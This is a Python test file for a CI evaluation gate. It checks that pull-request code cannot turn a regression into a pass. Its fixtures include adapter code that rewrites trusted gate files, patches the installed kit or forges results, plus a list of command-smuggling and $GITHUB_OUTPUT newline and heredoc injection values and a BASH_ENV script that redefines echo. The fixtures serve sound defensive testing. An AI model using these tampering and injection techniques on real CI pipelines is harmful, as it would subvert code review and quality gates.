        job = runner.jobs["baseline"]
        self.assertEqual(job["result"], "failure")
        self.assertIn("::error title=Baseline refused::The run is a placeholder", job["log"])
        self.assertIn("offline_stub", job["log"])
        self.assertIn("JUDGE_PROVIDER", job["log"])
        self.assertEqual(self.evalsprint_commands(runner), ["run"])  # never reaches `baseline`
        self.assertEqual(self.calls(runner, "gh"), [])  # and never opens a pull request
        self.assertEqual(git(runner.workspace, "status", "--porcelain", "--", "evals/baseline"), "")  # the committed baseline was not touched

    def test_only_a_literal_true_marks_a_placeholder(self):
        for value in (False, None, "true", 1, "yes"):
            with self.subTest(placeholder=value):
                runner = self.baseline_run(STUB_SUMMARY=json.dumps({**self.HEALTHY, "placeholder": value}))
                self.assertEqual(runner.jobs["baseline"]["result"], "success", runner.jobs["baseline"]["log"])
                self.assertEqual(len(self.gh_state(runner)["prs"]), 1)

    def test_the_pr_body_shows_the_attempt_error_rate_and_warns_when_it_is_above_zero(self):
        attempts = {"n_attempts": 120, "n_attempt_errors": 3, "n_attempt_target_errors": 2, "n_attempt_judge_errors": 1, "attempt_error_rate": 0.025}
        (pr,) = self.gh_state(self.baseline_run(STUB_SUMMARY=json.dumps({**self.HEALTHY, **attempts})))["prs"]
        self.assertIn("| Attempt error rate | 2.5% (3 of 120 attempts; target 2, judge 1) |", pr["body"])
        self.assertIn("2.5% of the attempts errored", pr["body"])
        self.assertIn("`target_retries`", pr["body"])
        clean = {**self.HEALTHY, **attempts, "n_attempt_errors": 0, "n_attempt_target_errors": 0, "n_attempt_judge_errors": 0, "attempt_error_rate": 0.0}
        (pr,) = self.gh_state(self.baseline_run(STUB_SUMMARY=json.dumps(clean)))["prs"]
        self.assertIn("| Attempt error rate | 0.0% (0 of 120 attempts; target 0, judge 0) |", pr["body"])
        self.assertNotIn("of the attempts errored", pr["body"])
        (pr,) = self.gh_state(self.baseline_run())["prs"]  # a run written by an older kit has no such keys: no row, no invented number
        self.assertNotIn("Attempt error rate", pr["body"])

    def test_refuses_to_run_from_a_branch_other_than_the_default(self):
        def dispatched_from_a_feature_branch(doc):
            doc["jobs"]["baseline"]["env"]["DEFAULT_BRANCH"] = "trunk"

        runner = self.scenario(workflow=BASELINE_WORKFLOW, event="workflow_dispatch", patch=dispatched_from_a_feature_branch, secrets={"ANTHROPIC_API_KEY": "sk"})
        self.assertEqual(runner.jobs["baseline"]["result"], "failure")
        self.assertIn("Run this workflow from the default branch", runner.jobs["baseline"]["log"])
        self.assertEqual(self.calls(runner), [])

    def test_requires_an_api_key(self):
        runner = self.scenario(workflow=BASELINE_WORKFLOW, event="workflow_dispatch", secrets={})
        self.assertEqual(runner.jobs["baseline"]["result"], "failure")
        self.assertIn("No API key", runner.jobs["baseline"]["log"])


E2E_CASES = "".join(
    json.dumps({"id": f"c{i}", "input": f"question {i}", "tags": ["safety"] if i < 2 else [], "must_include": f"topic {i}"}) + "\n" for i in range(10)
)
E2E_ADAPTER = """
def answer(text, params):
    if text in params.get("broken", []):
        return "no."
    return "A complete and polite answer to: " + text
"""
E2E_EVAL = """suite: e2e
dataset: cases.jsonl
target:
  callable: target_adapter.py:answer
  params: {broken: []}
judges:
  - {type: min_chars, name: not_empty, value: 20}
  - {type: not_contains, name: no_leak, values: [system prompt]}
gate:
  max_pass_rate_drop: 0.02
  critical_tags: [safety]
"""


def make_real_origin(root: Path, eval_yaml: str = E2E_EVAL, remove_baseline: bool = False) -> Path:
    """A repository whose baseline was produced by the REAL evalsprint CLI (heuristic judges only: offline).

    `remove_baseline` adds a second commit that deletes evals/baseline/ (a merged pull request that removed it).
    """
    root.mkdir(parents=True, exist_ok=True)
    seed = root / "seed"
    seed.mkdir()
    git(seed, "init", "-q", "-b", "main")
    write(seed / "evals" / "eval.yaml", eval_yaml)
    write(seed / "evals" / "cases.jsonl", E2E_CASES)
    write(seed / "evals" / "target_adapter.py", E2E_ADAPTER)
    write(seed / "evals" / "requirements.txt", "evalsprint @ git+https://github.com/example/eval-sprint@v0.2.0\n")
    env = {**os.environ, "PYTHONPATH": str(ROOT), "PYTHONUTF8": "1"}
    for args in (["run", "-c", "evals/eval.yaml", "--label", "base", "--out", "runs/base", "--no-report", "--quiet"], ["baseline", "runs/base", "--to", "evals/baseline"]):
        done = subprocess.run([sys.executable, "-m", "evalsprint", *args], cwd=seed, env=env, capture_output=True, text=True, encoding="utf-8")
        assert done.returncode == 0, (args, done.stdout, done.stderr)
    shutil.rmtree(seed / "runs")
    git(seed, "add", "-A")
    git(seed, "commit", "-q", "-m", "base with a real baseline")
    if remove_baseline:
        git(seed, "rm", "-r", "-q", "evals/baseline")
        git(seed, "commit", "-q", "-m", "remove the baseline")
    origin = root / "origin.git"
    git(root, "clone", "-q", "--bare", str(seed), str(origin))
    return origin


@needs_tools
class RealCliEndToEndTests(PrWorkflowBase):
    """The shipped PR workflow with the REAL evalsprint (no stub): run, compare and report on real files.

    This is where "a pull request cannot approve its own judge, gate, test-set or quality change" is shown
    with the real gate code instead of a stub that pretends to judge.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.real_origin = make_real_origin(cls.tmp / "origin_real")

    def pr(self, edits: dict[str, str], origin: Path | None = None) -> Runner:
        return self.scenario(origin=origin or self.real_origin, pr_edits=edits, real_kit=True)

    def reasons(self, runner: Runner) -> str:
        return repr(self.gate_json(runner)["reasons"])

    @staticmethod
    def logs(runner: Runner) -> str:
        return "".join(f"--- {job}\n{record['log'][-900:]}" for job, record in runner.jobs.items())

    def test_an_unchanged_change_passes_with_the_real_gate(self):
        runner = self.pr({"src/llm/prompt.txt": "a wording change that the stub bot ignores\n"})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "pass", "exit_code": "0"}, self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        self.assertIn("No regression", self.gate_md(runner))
        self.assertTrue((runner.workspace / "runs" / "candidate" / "summary.json").exists())
        self.assertTrue((runner.artifacts / "eval-report-7" / "candidate" / "report.html").exists())  # a real report, built by the kit the base branch pins

    def test_a_real_quality_drop_is_blocked(self):
        broken = E2E_EVAL.replace("params: {broken: []}", "params: {broken: [question 4, question 5, question 6]}")
        runner = self.pr({"evals/eval.yaml": broken.replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 1.0")})  # and it loosens its own gate
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "regression", self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("pass rate dropped", self.reasons(runner))

    def test_a_pr_cannot_loosen_a_judge_and_approve_it_in_the_same_change(self):
        # The PR lowers the judge's threshold, turns the judge-change protection off and relaxes the gate, all in its own eval.yaml.
        sneaky = E2E_EVAL.replace("value: 20", "value: 1").replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 1.0\n  allow_judge_changes: true")
        runner = self.pr({"evals/eval.yaml": sneaky})
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "regression", self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("judge configuration or rubric changed: update the baseline in a reviewed PR", self.reasons(runner))
        self.assertIn("judge configuration or rubric changed", self.gate_md(runner))

    def test_control_the_same_judge_edit_is_a_warning_when_the_base_branch_allows_it(self):
        allowing = make_real_origin(self.tmp / "origin_real_allow", E2E_EVAL.replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 0.02\n  allow_judge_changes: true"))
        runner = self.pr({"evals/eval.yaml": E2E_EVAL.replace("value: 20", "value: 1").replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 0.02\n  allow_judge_changes: true")}, origin=allowing)
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "pass", self.logs(runner))
        self.assertIn("allowed by gate.allow_judge_changes", self.gate_md(runner))  # the warning is in the comment

    def test_a_base_branch_that_lost_its_baseline_blocks_a_real_regression_instead_of_going_quiet(self):
        """Critic scenario 13: baseline deleted on main, then a pull request that really breaks the bot. It used to pass."""
        deleted = make_real_origin(self.tmp / "origin_real_deleted", remove_baseline=True)
        broken = E2E_EVAL.replace("params: {broken: []}", "params: {broken: [question 4, question 5, question 6]}")
        runner = self.pr({"evals/eval.yaml": broken.replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 1.0")}, origin=deleted)
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "baseline_missing", "exit_code": "2"}, self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIsNone(runner.workspace, "no paid run: the job that would execute the PR never started")
        self.assertIn("baseline missing on the base branch", self.gate_md(runner))
        # Control: with the baseline in place the very same pull request is a regression, judged by the real gate.
        control = self.pr({"evals/eval.yaml": broken.replace("max_pass_rate_drop: 0.02", "max_pass_rate_drop: 1.0")})
        self.assertEqual(control.jobs["compare"]["outputs"]["verdict"], "regression")

    def test_editing_or_deleting_cases_is_blocked(self):
        edited = E2E_CASES.replace('"must_include": "topic 3"', '"must_include": "topic 3 (relaxed)"')  # a judge-facing field, not the input
        lines = edited.splitlines(keepends=True)
        runner = self.pr({"evals/cases.jsonl": "".join(lines[:-1])})  # and the last case is deleted
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "regression", self.logs(runner))
        reasons = self.reasons(runner)
        self.assertIn("test cases were edited", reasons)
        self.assertIn("missing from the candidate", reasons)


TAMPERED_GATE = "suite: e2e\ndataset: cases.jsonl\ngate:\n  max_pass_rate_drop: 1.0\n  max_error_rate: 1.0\n  critical_tags: []\n  allow_judge_changes: true\n"
# Adapter code of a pull request that tries to reach the trusted gate and baseline while `evalsprint run` executes it (scenario 12
# of the cycle-2 critic): where the v0.1 workflow kept its copies, it loosens the gate and zeroes the baseline's pass rate.
ADAPTER_REWRITES_TRUSTED_FILES = E2E_ADAPTER + """

_answer = answer


def _once():
    import os
    try:
        os.close(os.open("tamper.lock", os.O_CREAT | os.O_EXCL))  # the cases run in threads: only the first one does the job
        return True
    except FileExistsError:
        return False


def answer(text, params):
    import json, os, pathlib

    if _once():
        pathlib.Path("tamper_ran.txt").write_text("the adapter ran in this job\\n", encoding="utf-8")
        trusted = pathlib.Path(os.environ["RUNNER_TEMP"]) / "trusted"
        try:
            if (trusted / "eval.yaml").exists():
                (trusted / "eval.yaml").write_text(%(gate)r, encoding="utf-8")
                summary = trusted / "evals" / "baseline" / "summary.json"
                data = json.loads(summary.read_text(encoding="utf-8"))
                summary.write_text(json.dumps({**data, "pass_rate": 0.0}), encoding="utf-8")
        except Exception:
            pass
    return _answer(text, params)
""" % {"gate": TAMPERED_GATE}
# Adapter code that patches the evalsprint it runs inside (the kit installed in its own job): `compare` would then exit 0.
ADAPTER_PATCHES_THE_INSTALLED_KIT = E2E_ADAPTER + """

_answer = answer


def _once():
    import os
    try:
        os.close(os.open("tamper.lock", os.O_CREAT | os.O_EXCL))  # the cases run in threads: only the first one does the job
        return True
    except FileExistsError:
        return False


def answer(text, params):
    import pathlib

    import evalsprint

    if _once():
        pathlib.Path("tamper_ran.txt").write_text("the adapter ran in this job\\n", encoding="utf-8")
        cli = pathlib.Path(evalsprint.__file__).parent / "cli.py"
        assert "site" in cli.parts, cli  # the copy this job installed, never the repository under test
        cli.write_text(cli.read_text(encoding="utf-8") + %(patch)r, encoding="utf-8")
    return _answer(text, params)
""" % {"patch": KIT_PATCH}
# Adapter code that does not try to reach anything: it makes its results up after the run (what the split does NOT prevent).
ADAPTER_FORGES_ITS_RESULTS = E2E_ADAPTER + """

import atexit
import json
import pathlib
import shutil


def _forge():
    candidate, baseline = pathlib.Path("runs/candidate"), pathlib.Path("evals/baseline")
    if candidate.is_dir() and baseline.is_dir():
        for name in ("results.jsonl", "summary.json"):
            shutil.copyfile(baseline / name, candidate / name)
        pathlib.Path("tamper_ran.txt").write_text("results replaced by the baseline's\\n", encoding="utf-8")


atexit.register(_forge)
"""
REGRESSING_EVAL = E2E_EVAL.replace("params: {broken: []}", "params: {broken: [question 4, question 5, question 6]}")  # three cases break: a real regression


@needs_tools
class TamperTests(PrWorkflowBase):
    """C3-09 / cycle-2 critic scenario 12: code of a pull request that runs in the eval job cannot change the verdict.

    Every attack below is run twice, with the REAL evalsprint installed per job: against the shipped workflow (blocked) and against
    the single-job workflow of v0.1 (tests/fixtures/ci/evals_single_job.yml, where the same attack turns a regression green).
    The second run is the control: without it a test of an attack that never worked would pass just as well.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.real_origin = make_real_origin(cls.tmp / "origin_real_tamper")
        cls.kit_before = (ROOT / "evalsprint" / "cli.py").read_bytes()

    @classmethod
    def tearDownClass(cls):
        # The adapters above patch the kit of THEIR job; make sure that never reached the repository under test.
        assert (ROOT / "evalsprint" / "cli.py").read_bytes() == cls.kit_before
        super().tearDownClass()

    def attack(self, workflow, adapter: str | None = None, extra: dict[str, str] | None = None, eval_yaml: str = REGRESSING_EVAL) -> Runner:
        edits = {"evals/eval.yaml": eval_yaml, **(extra or {})}
        if adapter is not None:
            edits["evals/target_adapter.py"] = adapter
        return self.scenario(origin=self.real_origin, pr_edits=edits, real_kit=True, workflow=workflow)

    def logs(self, runner: Runner) -> str:
        return "".join(f"--- {job}\n{record['log'][-900:]}" for job, record in runner.jobs.items())

    def test_control_without_any_attack_the_regression_is_blocked_by_both_workflows(self):
        for workflow in (PR_WORKFLOW, SINGLE_JOB_WORKFLOW):
            with self.subTest(workflow=Path(workflow).name):
                runner = self.attack(workflow)
                self.assertEqual(self.verdict(runner), "regression", self.logs(runner))
                self.assertEqual(runner.jobs["gate"]["result"], "failure")

    def test_adapter_code_that_rewrites_the_trusted_gate_and_baseline_changes_nothing(self):
        """The critic's scenario 12. Old: the gate config and the baseline copy sat in $RUNNER_TEMP/trusted of the job that runs the adapter."""
        blocked = self.attack(PR_WORKFLOW, ADAPTER_REWRITES_TRUSTED_FILES)
        self.assertTrue((blocked.workspace / "tamper_ran.txt").exists(), "the attack code did run in the evals job")
        self.assertEqual(self.verdict(blocked), "regression", self.logs(blocked))
        self.assertEqual(blocked.jobs["gate"]["result"], "failure")
        self.assertFalse((blocked.temp_of("evals") / "trusted").exists(), "structurally impossible: the eval job holds no trusted copy to rewrite")
        self.assertIn("pass rate dropped", repr(self.gate_json(blocked)["reasons"]))
        # Control: the very same attack against the v0.1 workflow loosens the gate and the regression passes.
        old = self.attack(SINGLE_JOB_WORKFLOW, ADAPTER_REWRITES_TRUSTED_FILES)
        self.assertTrue((old.workspace / "tamper_ran.txt").exists())
        self.assertTrue((old.temp_of("evals") / "trusted" / "eval.yaml").exists())
        self.assertEqual(self.verdict(old), "pass", self.logs(old))
        self.assertEqual(old.jobs["gate"]["result"], "success")

    def test_adapter_code_that_patches_the_installed_kit_changes_nothing(self):
        """In the evals job the PR's code and the kit that `run` uses share an environment; the comparison uses another one."""
        blocked = self.attack(PR_WORKFLOW, ADAPTER_PATCHES_THE_INSTALLED_KIT)
        self.assertTrue((blocked.workspace / "tamper_ran.txt").exists())
        patched = (blocked.home_of("evals") / "site" / "evalsprint" / "cli.py").read_text(encoding="utf-8")
        self.assertIn("injected by the pull request", patched)  # the evals job's own kit was patched...
        clean = (blocked.home_of("compare") / "site" / "evalsprint" / "cli.py").read_text(encoding="utf-8")
        self.assertNotIn("injected by the pull request", clean)  # ...the compare job's was installed separately
        self.assertEqual(self.verdict(blocked), "regression", self.logs(blocked))
        self.assertEqual(blocked.jobs["gate"]["result"], "failure")
        old = self.attack(SINGLE_JOB_WORKFLOW, ADAPTER_PATCHES_THE_INSTALLED_KIT)
        self.assertEqual(self.verdict(old), "pass", self.logs(old))  # where `compare` ran from the patched kit, it exited 0
        self.assertEqual(old.jobs["gate"]["result"], "success")

    def test_a_pr_that_swaps_the_kit_in_its_requirements_changes_nothing(self):
        swapped = {"evals/requirements.txt": "evalsprint @ git+https://github.com/evil/evil-kit@v9.9.9\n"}
        blocked = self.attack(PR_WORKFLOW, extra=swapped)
        evil = (blocked.home_of("evals") / "site" / "evalsprint" / "cli.py").read_text(encoding="utf-8")
        self.assertIn("injected by the pull request", evil)  # the candidate run did use the PR's kit...
        self.assertNotIn("injected by the pull request", (blocked.home_of("compare") / "site" / "evalsprint" / "cli.py").read_text(encoding="utf-8"))  # ...the comparison did not
        self.assertEqual(self.verdict(blocked), "regression", self.logs(blocked))
        self.assertEqual(blocked.jobs["gate"]["result"], "failure")
        old = self.attack(SINGLE_JOB_WORKFLOW, extra=swapped)
        self.assertEqual(self.verdict(old), "pass", self.logs(old))
        self.assertEqual(old.jobs["gate"]["result"], "success")

    def test_what_the_split_does_not_protect_a_pr_that_forges_its_own_results_still_passes(self):
        """Stated limit, tested so the docs cannot drift from it: the candidate is produced by the PR's code, so a PR that makes
        its results up is judged on the made-up results. The defense is code review (CODEOWNERS on evals/ and the adapter), not this gate."""
        runner = self.attack(PR_WORKFLOW, ADAPTER_FORGES_ITS_RESULTS)
        self.assertTrue((runner.workspace / "tamper_ran.txt").exists())
        self.assertEqual(self.verdict(runner), "pass", self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        self.assertIn("The candidate results themselves come from the pull request's code.", self.gate_md(runner))  # and the comment says so


class OutputFileGrammarTests(unittest.TestCase):
    """The emulator reads $GITHUB_OUTPUT the way the runner does: an injection test is only as good as this parser."""

    def test_key_value_heredoc_and_the_last_definition_wins(self):
        self.assertEqual(parse_output_file("a=1\nb<<EOF\nx\ny\nEOF\na=2\n"), {"a": "2", "b": "x\ny"})
        self.assertEqual(parse_output_file("a=\n\nb=c=d\n"), {"a": "", "b": "c=d"})
        self.assertEqual(parse_output_file("k<<X\nX\n"), {"k": ""})
        self.assertEqual(parse_output_file("a=b<<c\n"), {"a": "b<<c"})  # the `=` came first: a plain assignment

    def test_the_cycle_3_critics_unterminated_heredoc_is_closed_by_the_steps_own_echo(self):
        """H2: the PR's code appends `exit_code<<exit_code=0` and two lines; the step's own `echo exit_code=0` is the delimiter."""
        self.assertEqual(parse_output_file("exit_code<<exit_code=0\n3\nverdict=pass\nexit_code=0\n"), {"exit_code": "3\nverdict=pass"})

    def test_a_value_with_a_newline_is_several_lines_of_the_file(self):
        """The mechanism of the injection: `echo "exit_code=$code"` with a code of "3\\nverdict=pass" defines TWO outputs."""
        self.assertEqual(parse_output_file("exit_code=3\nverdict=pass\n"), {"exit_code": "3", "verdict": "pass"})

    def test_what_the_runner_refuses_fails_the_step(self):
        for bad in ("just text\n", "=v\n", "k<<\nx\n", "k<<EOF\nx\n", "k<<EOF\nx\nEOF2\n", "<<EOF\nx\nEOF\n"):
            with self.subTest(bad=bad), self.assertRaises(OutputFileError):
                parse_output_file(bad)
        with self.assertRaises(OutputFileError) as caught:  # what was read before the bad line stays set
            parse_output_file("a=1\nnot a line\n")
        self.assertEqual(caught.exception.partial, {"a": "1"})


# What a pull request's job can leave in the `run_exit_code` job output, and what the trusted job must make of it.
HOSTILE_RUN_CODES = [
    " ", "0 ", " 0", "00", "03", "007", "1000", "-1", "+1", "0x3", "1e1", "3.0", "١", "０",
    "0\n", "\n0", "0\nverdict=pass", "3\nverdict=pass", "0\nexit_code=0", "3\r\nverdict=pass", "0\x0b", "\t0",
    "$(touch pwned)", "`touch pwned`", "0; touch pwned", "0 && touch pwned", "'; touch pwned; '", '"; touch pwned; "',
    "::error::boom", "::add-mask::0", "::stop-commands::x", "0\n::warning title=pwned::x", "%0A", "0%0Averdict=pass",
    "run_code=0", "0\nfiles<<kit=true\ntrue\n", "0\nrun_state<<kit=true\nran\n", "x" * 5000,
]  # fmt: skip
GENUINE_RUN_CODES = ["0", "1", "2", "3", "7", "42", "127", "130", "137", "255"]
PLAN_KEYS = {"run_code", "run_state", "evals_result", "files", "kit"}


def adapter_writing_to_github_output(body: str) -> str:
    """Adapter code of a pull request that appends `body` to the step's $GITHUB_OUTPUT when the run ends (before the step's own echo)."""
    return E2E_ADAPTER + """

import atexit
import os


def _inject():
    with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as fh:
        fh.write(%r)


atexit.register(_inject)
""" % body


# The PR controls the shell of the step that runs `evalsprint run` (BASH_ENV): `echo exit_code=...` writes a whole heredoc instead.
BASH_ENV_REDEFINES_ECHO = """if [ "$STUB_JOB" = evals ]; then
  echo() { case "$1" in exit_code=*) builtin echo 'exit_code<<EOF'; builtin echo 3; builtin echo 'verdict=pass'; builtin echo EOF;; *) builtin echo "$@";; esac; }
fi
"""
VALIDATION_LINES = {
    # mutation -> (pattern of the lines it removes from the shipped workflow, how many it removes)
    "plan": (r'(?m)^[ ]*case "\$RUN_CODE" in .*\n', 2),
    "verdict": (r'(?m)^[ ]*case "\$(?:verdict|code)" in (?:pass\|regression|\'\'\|).*\n', 2),
    "gate": (r'(?m)^[ ]*case "\$EXIT_CODE" in .*\n', 1),
}


@needs_tools
class InjectionChecks(PrWorkflowBase):
    """The checks of C16, as methods that return the list of violations: the tests assert `== []` on the shipped workflow, and the
    mutation tests assert `!= []` on a copy with one validation deleted. No test of its own here."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.real_origin = make_real_origin(cls.tmp / "origin_real_injection")
        cls.evil_bash_env = cls.tmp / "evil_bash_env.sh"
        cls.evil_bash_env.write_text(BASH_ENV_REDEFINES_ECHO, encoding="utf-8")
        cls.unvalidated = FIXTURES_CI / "evals_unvalidated_output.yml"

    # ---- helpers
    def attack(self, adapter: str | None = None, workflow: str | Path = PR_WORKFLOW, **kwargs) -> Runner:
        edits = {"evals/eval.yaml": REGRESSING_EVAL}  # a real regression: three cases break
        if adapter is not None:
            edits["evals/target_adapter.py"] = adapter
        return self.scenario(origin=self.real_origin, pr_edits=edits, real_kit=True, workflow=workflow, **kwargs)

    @staticmethod
    def logs(runner: Runner) -> str:
        return "".join(f"--- {job}\n{record['log'][-900:]}" for job, record in runner.jobs.items())

    def plan_violations(self, workflow: str | Path = PR_WORKFLOW) -> list[str]:
        """Layer 1: what the Plan step writes for every hostile exit code, and for every genuine one."""
        problems = []
        for raw in HOSTILE_RUN_CODES:
            out = self.plan(raw, workflow=workflow)
            if set(out) != PLAN_KEYS:
                problems.append(f"{raw[:30]!r}: outputs are {sorted(out)}")
            elif out["run_code"] != "255" or out["run_state"] != "garbled" or out["files"] != "false" or out["kit"] != "false":
                problems.append(f"{raw[:30]!r}: read as {out}")
        for raw in GENUINE_RUN_CODES:
            out = self.plan(raw, workflow=workflow)
            if out.get("run_code") != raw or out.get("run_state") != "ran":
                problems.append(f"genuine {raw!r} read as {out}")
        out = self.plan("")
        if out.get("run_state") != "none" or out.get("run_code") != "255":
            problems.append(f"empty read as {out}")
        return problems

    def verdict_violations(self, workflow: str | Path = PR_WORKFLOW) -> list[str]:
        """Layer 2: the verdict step is given garbage by every channel it reads and still writes only a closed set."""
        problems = []
        garbage = "3\nverdict=pass"
        cases = [
            ("run_code", dict(plan_override={"run_code": garbage, "run_state": "ran", "files": "false"})),
            ("run_code and exit_code injected", dict(plan_override={"run_code": "0\nexit_code=0", "run_state": "ran", "files": "false"})),
            ("run_state", dict(plan_override={"run_state": "ran\nverdict=pass"})),
            ("compare exit code", dict(compare_code="1\nverdict=pass", files={"eval-out/gate.md": "## x\n"})),
            ("compare exit code, number", dict(compare_code="99999", files={"eval-out/gate.md": "## x\n"})),
        ]
        for what, kwargs in cases:
            runner = self.decide("0", workflow=workflow, **kwargs)
            outputs = runner.jobs["compare"]["outputs"]
            if outputs != {"verdict": "error", "exit_code": "255"}:  # garbage in is an error out, in the closed set, and nothing else
                problems.append(f"{what}: outputs {outputs!r}")
            if runner.jobs["gate"]["result"] != "failure":
                problems.append(f"{what}: the gate is {runner.jobs['gate']['result']}")
        return problems

    def gate_violations(self, workflow: str | Path = PR_WORKFLOW) -> list[str]:
        """Layer 3: the gate job prints a hostile exit code of the compare job as `unknown`, never as itself."""
        problems = []
        for hostile in ("9\n::warning title=pwned::x", "::error title=pwned::x"):
            runner = self.scenario(
                only=("gate",), workflow=workflow,
                seed={**KEYS, **RELEVANT, **TRUSTED_OK, "evals": {"result": "success"}, "compare": {"result": "success", "outputs": {"verdict": "error", "exit_code": hostile}}},
            )  # fmt: skip
            log = runner.jobs["gate"]["log"]
            if "pwned" in log or len(runner.annotations("gate", "error")) != 1 or runner.annotations("gate", "warning"):
                problems.append(f"{hostile!r}: the gate log carries it: {log!r}")
            if runner.jobs["gate"]["result"] != "failure":
                problems.append(f"{hostile!r}: the gate is {runner.jobs['gate']['result']}")
        return problems

    def attack_violations(self, runner: Runner) -> list[str]:
        """Layer 4: the evals job handed over `3\\nverdict=pass`; what must be true afterwards."""
        problems = []
        if runner.jobs["evals"]["outputs"].get("run_exit_code") != "3\nverdict=pass":
            problems.append(f"the injection did not reach the job output: {runner.jobs['evals']['outputs']!r} (the attack is not live)")
        plan = runner.jobs["compare"]["steps"].get("plan", {}).get("outputs", {})
        if (plan.get("run_code"), plan.get("run_state")) != ("255", "garbled"):
            problems.append(f"the Plan step read it as {plan!r}")
        if runner.jobs["compare"]["outputs"] != {"verdict": "error", "exit_code": "255"}:
            problems.append(f"the compare job decided {runner.jobs['compare']['outputs']!r}")
        if runner.jobs["gate"]["result"] != "failure":
            problems.append(f"the gate is {runner.jobs['gate']['result']}")
        return problems

@needs_tools
class OutputInjectionTests(InjectionChecks):
    """C16, release blocker of v0.2.0: the PR's job cannot turn a regression into a pass through what it hands to the compare job.

    Cycle-3 critic, 04b_output_injection.py. The evals job runs the PR's code, and its job output `run_exit_code` is text that code can
    write: with the runner's own $GITHUB_OUTPUT grammar (a value with a newline is several lines; a heredoc whose delimiter is guessable
    is closed by the step's next `echo`), the compare job used to copy it into ITS outputs, and `3\\nverdict=pass` became the verdict.

    Four layers, each checked alone so that removing any one of them turns a check red (MutationTests does exactly that):
    1. the Plan step checks the exit code (1 to 3 digits, else 255) and writes only checked values;
    2. the verdict step writes only words and numbers of a closed set to its outputs, whatever it was given;
    3. the gate job prints nothing it was not sure of;
    4. end to end, with the real CLI, the critic's H1, H2 and H4 attacks fail against the shipped workflow and succeed against the
       frozen pre-fix one (tests/fixtures/ci/evals_unvalidated_output.yml): without that control the tests would pass just as well
       if the attack never worked.
    What stays possible, and is documented as such: a PR that hands over a genuine `0` and forges its candidate files (TamperTests).
    """

    # ---- static
    def test_only_the_plan_step_reads_what_the_prs_job_produced_and_it_checks_it_first(self):
        doc = load_workflow(PR_WORKFLOW)
        for job_id, job in doc["jobs"].items():
            for step in job["steps"]:
                reads = "needs.evals.outputs" in json.dumps(step)
                if reads:
                    self.assertEqual((job_id, step.get("id")), ("compare", "plan"))
            self.assertNotIn("needs.evals.outputs", json.dumps(job.get("env", {})), job_id)
        plan = step_named(doc, "compare", "plan")["run"]
        literal = """case "$RUN_CODE" in ''|*[!0-9]*|????*) RUN_CODE=255;; esac"""  # the contract of C16, verbatim
        self.assertIn(literal, plan)
        self.assertLess(plan.index(literal), plan.index("GITHUB_OUTPUT"), "validated before anything is written")
        verdict = step_named(doc, "compare", "verdict")["run"]
        closed = "case \"$code\" in ''|*[!0-9]*|????*) code=255 ;; esac"
        self.assertIn(closed, verdict)
        self.assertLess(verdict.index(closed), verdict.index('echo "verdict=$verdict"'), "the closed set is enforced before the outputs are written")
        for var in ("RUN_CODE", "RUN_STATE", "EVALS_RESULT"):
            self.assertRegex(step_named(doc, "compare", "verdict")["env"][var], r"^\$\{\{ steps\.plan\.outputs\.")  # the checked copies, not the raw output

    def test_the_gate_job_checks_the_exit_code_before_it_prints_it(self):
        script = load_workflow(PR_WORKFLOW)["jobs"]["gate"]["steps"][0]["run"]
        check = """case "$EXIT_CODE" in ''|*[!0-9]*|????*) EXIT_CODE=unknown"""
        self.assertIn(check, script)
        self.assertLess(script.index(check), script.index("${EXIT_CODE:-unknown}"))

    # ---- layer 1
    def test_the_plan_step_turns_every_hostile_exit_code_into_255_and_writes_nothing_else(self):
        self.assertEqual(self.plan_violations(), [])
        self.assertFalse(list(self.tmp.rglob("pwned")), "a value from the PR's job was executed by a trusted step")

    def test_a_value_too_large_for_the_environment_fails_the_plan_step_and_the_gate_stays_red(self):
        """A 100 kB value is read and refused; a 300 kB one cannot even be passed to the step (E2BIG): the verdict step still answers."""
        self.assertEqual(self.plan("9" * 100_000)["run_state"], "garbled")
        runner = self.scenario(
            clone=False, only=("compare", "gate"), seed={**KEYS, **RELEVANT, "trusted": TRUSTED_OK["trusted"], "evals": {"result": "success", "outputs": {"run_exit_code": "9" * 300_000}}},
        )  # fmt: skip
        self.assertEqual(runner.jobs["compare"]["steps"]["plan"]["outcome"], "failure")
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "error", "exit_code": "255"}, runner.jobs["compare"]["log"])
        self.assertIn("the Plan step of the compare job", self.gate_md(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")

    # ---- layer 2 and 3
    def test_the_verdict_step_writes_only_a_closed_set_whatever_it_is_given(self):
        self.assertEqual(self.verdict_violations(), [])

    def test_the_gate_job_prints_a_hostile_exit_code_as_unknown(self):
        self.assertEqual(self.gate_violations(), [])

    # ---- layer 4
    def test_control_without_an_attack_the_regression_is_blocked_and_the_exit_code_is_a_plain_zero(self):
        runner = self.attack()
        self.assertEqual(runner.jobs["evals"]["outputs"], {"run_exit_code": "0"})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "regression", "exit_code": "1"}, self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")

    def test_h1_a_terminated_heredoc_before_the_steps_own_echo_changes_nothing(self):
        """The step's `echo exit_code=0` comes last and overrides whatever the PR wrote earlier: no injection, still a regression."""
        runner = self.attack(adapter_writing_to_github_output("exit_code<<EOF\n3\nverdict=pass\nEOF\n"))
